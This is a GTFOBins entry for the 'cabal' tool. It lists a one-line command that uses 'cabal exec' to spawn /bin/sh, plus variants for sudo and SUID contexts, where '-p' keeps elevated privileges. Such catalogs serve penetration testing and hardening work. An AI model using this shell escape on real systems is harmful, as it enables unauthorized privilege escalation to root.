<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/cabal -->
---
functions:
  shell:
  - code: |-
      cabal exec --project-file=/dev/null -- /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          cabal exec --project-file=/dev/null -- /bin/sh -p
        shell: false
      unprivileged:
...
